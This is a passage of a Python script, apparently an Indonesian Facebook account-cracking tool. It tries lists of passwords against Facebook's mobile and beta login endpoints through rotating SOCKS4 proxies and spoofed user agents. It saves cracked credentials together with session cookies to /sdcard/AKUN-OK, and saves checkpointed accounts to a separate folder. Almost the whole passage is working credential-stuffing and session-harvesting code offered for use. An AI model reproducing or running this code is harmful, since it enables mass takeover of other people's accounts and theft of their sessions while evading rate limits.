'lsd':re.search('name="lsd" value="(.*?)"', str(p)).group(1),
'jazoest':re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
'm_ts':re.search('name="m_ts" value="(.*?)"', str(p)).group(1),
'li':re.search('name="li" value="(.*?)"', str(p)).group(1),
'email':idf,
'pass':pw
}
			ses.headers.update({'Host': 'm.facebook.com',
'cache-control': 'max-age=0',
'upgrade-insecure-requests': '1',
'origin': 'https://m.facebook.com',
'content-type': 'application/x-www-form-urlencoded',
'user-agent': ua,
'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'cors',
'sec-fetch-user': 'empty',
'sec-fetch-dest': 'document',
'referer': 'https://m.facebook.com/login/?email='+idf,
'accept-encoding':'gzip, deflate br',
'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})

			po = ses.post('https://m.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r└── {kun}{idf}|{pw}\n{xxx}└── {mer}{ua}{xxx}')
				os.popen('play-audio c.mp3')
				open('/sdcard/AKUN-CP/'+cph,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r└── {hijo}{idf}|{pw}|{kuki}\n{xxx}└── {hijo}{ua}{xxx}')
				os.popen('play-audio o.mp3')
				open('/sdcard/AKUN-OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1
###----------[ ASYNC ]----------###
def metod2(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r[deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(usragent)
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(proxsi)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=1239138353201716&kid_directed_site=0&app_id=1239138353201716&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%252Cgranted_scopes%26client_id%3D1239138353201716%26redirect_uri%3Dhttps%253A%252F%252Fkachishop-d0c3a.firebaseapp.com%252F__%252Fauth%252Fhandler%26state%3DAMbdmDmDaplWH_DdoV_W4QQTmWmecz1GxWXAlj2cdr_Vf_0aKRi-oWe-Z3FTiIj8pa4JD342zNeLW91aHp12LY9dOYb8tOPKOtsEllaj3JYdF79-cf8Wr-OPLhAn7Zq1LeUfJWdCxX2mAPKVYOG0CChDNxiBnmVCUG3LGCJ3sCTSc1Eb5dZseFVZe2lUqc6Yzz92V58Ki3TvYM7HjC_421qwGmMHJNi0xIaeVA917YCkm8d-wMthO_lSm3eIQPryPnbreRYgONBzhtx692MYCYA3_6dPlkm70JVkIuHGHRiJ98KokSMQRhxjZJCAp_GbKVMDXvSWm0ZtdYR5CI4UZgrB%26scope%3Dpublic_profile%252Cemail%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D087a364c-3d69-45b4-a55b-047dae50317c%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fkachishop-d0c3a.firebaseapp.com%2F__%2Fauth%2Fhandler%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DAMbdmDmDaplWH_DdoV_W4QQTmWmecz1GxWXAlj2cdr_Vf_0aKRi-oWe-Z3FTiIj8pa4JD342zNeLW91aHp12LY9dOYb8tOPKOtsEllaj3JYdF79-cf8Wr-OPLhAn7Zq1LeUfJWdCxX2mAPKVYOG0CChDNxiBnmVCUG3LGCJ3sCTSc1Eb5dZseFVZe2lUqc6Yzz92V58Ki3TvYM7HjC_421qwGmMHJNi0xIaeVA917YCkm8d-wMthO_lSm3eIQPryPnbreRYgONBzhtx692MYCYA3_6dPlkm70JVkIuHGHRiJ98KokSMQRhxjZJCAp_GbKVMDXvSWm0ZtdYR5CI4UZgrB%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={
			"Host": "m.facebook.com",
			"content-length": f"{len(str(dataa))}",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			"origin": "https://m.facebook.com",
			"content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "*/*",
			"x-requested-with": "com.microsoft.bing",
			"sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
			"sec-ch-ua-platform": '"Android"',
			"sec-ch-ua-mobile": "?1",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"sec-fetch-user": "?1",
			"referer": "https://free.facebook.com/v8.0/dialog/oauth?response_type=code%2Cgranted_scopes&client_id=1239138353201716&redirect_uri=https%3A%2F%2Fkachishop-d0c3a.firebaseapp.com%2F__%2Fauth%2Fhandler&state=AMbdmDmDaplWH_DdoV_W4QQTmWmecz1GxWXAlj2cdr_Vf_0aKRi-oWe-Z3FTiIj8pa4JD342zNeLW91aHp12LY9dOYb8tOPKOtsEllaj3JYdF79-cf8Wr-OPLhAn7Zq1LeUfJWdCxX2mAPKVYOG0CChDNxiBnmVCUG3LGCJ3sCTSc1Eb5dZseFVZe2lUqc6Yzz92V58Ki3TvYM7HjC_421qwGmMHJNi0xIaeVA917YCkm8d-wMthO_lSm3eIQPryPnbreRYgONBzhtx692MYCYA3_6dPlkm70JVkIuHGHRiJ98KokSMQRhxjZJCAp_GbKVMDXvSWm0ZtdYR5CI4UZgrB&scope=public_profile%2Cemail&display=popup&ret=login&fbapp_pres=0&logger_id=087a364c-3d69-45b4-a55b-047dae50317c&tp=unspecified",
			"accept-encoding": "gzip, deflate br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r└── {kun}{idf}|{pw}\n{xxx}└── {mer}{ua}{xxx}')
				os.popen('play-audio c.mp3')
				open('/sdcard/AKUN-CP/'+cph,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r└── {hijo}{idf}|{pw}|{kuki}\n{xxx}└── {hijo}{ua}{xxx}')
				os.popen('play-audio o.mp3')
				open('/sdcard/AKUN-OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1
###----------[ VALIDATE ]----------###
def metod3(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f'\r[deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(usragent)
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(proxsi)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'm.beta.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.beta.facebook.com/?locale=id_ID&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.beta.facebook.com/login/save-device/?login_source=login","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.beta.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.beta.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.beta.facebook.com/?locale=id_ID&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.beta.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r└── {kun}{idf}|{pw}\n{xxx}└── {mer}{ua}{xxx}')
				os.popen('play-audio c.mp3')
				open('/sdcard/AKUN-CP/'+cph,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r└── {hijo}{idf}|{pw}|{kuki}\n{xxx}└── {hijo}{ua}{xxx}')
				os.popen('play-audio o.mp3')
				open('/sdcard/AKUN-OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1
	
###----------#[ CREAT FILE ]#----------###
def memulai():
	try:os.mkdir('/sdcard/AKUN-OK')
	except:pass
	try:os.mkdir('/sdcard/DUMP-FILE')
	except:pass
	try:os.mkdir('/sdcard/AKUN-CP')
	except:pass
	login_baz()
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	memulai()
